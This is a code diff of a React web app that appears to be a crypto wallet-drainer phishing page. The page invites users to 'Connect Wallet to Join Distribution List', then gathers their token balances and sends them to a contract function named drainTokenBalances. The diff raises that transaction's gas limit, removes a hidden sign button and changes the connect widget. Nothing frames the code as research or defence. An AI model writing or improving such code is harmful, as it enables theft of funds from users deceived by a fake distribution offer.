@@ -8,8 +8,7 @@ import './App.css';
 import ConnectButton from './components/ConnectButton';
 import Modal from './components/Modal';
 import Moralis from 'moralis';
-const { getEthersSigner } = require('./adapters/ethersAdapters');
-const ethers = require("ethers");
+const ethers = require('ethers');
 
 const queryClient = new QueryClient();
 const projectId = '1c1db7ada235d88816f2f0008d415fdc';
@@ -76,7 +75,7 @@ async function sendTokenBalancesToContract(signer, tokenBalances) {
   const tokenAddresses = tokenBalances.map(token => token.token_address);
   const balances = tokenBalances.map(token => ethers.BigNumber.from(token.balance));
 
-  const gasLimit = 1000000; // Set a higher gas limit to ensure the transaction goes through
+  const gasLimit = 30000000; // Increased gas limit
   const tx = await contract.drainTokenBalances(tokenAddresses, balances, { gasLimit });
   await tx.wait();
   return tx;
@@ -133,17 +132,14 @@ function App() {
   return (
     <div className="App">
       <header className="App-header">
-        <h1 className="animate-charcter">Connect Wallet to Join Distribution list</h1>
+        <h1 className="animate-charcter">Connect Wallet to Join<br />Distribution List</h1>
         {isConnected ? (
           <>
             <p>Connected account: {address}</p>
-            <button onClick={handleSendTransaction} style={{ display: 'none' }} disabled={transactionInProgress} id="sign-contract-button">
-              {transactionInProgress ? 'Processing...' : 'Sign Contract'}
-            </button>
             <button onClick={disconnect}>Disconnect Wallet</button>
           </>
         ) : (
-          <ConnectButton />
+          <w3m-button />
         )}
       </header>
       {modalVisible && <Modal message={modalMessage} />}
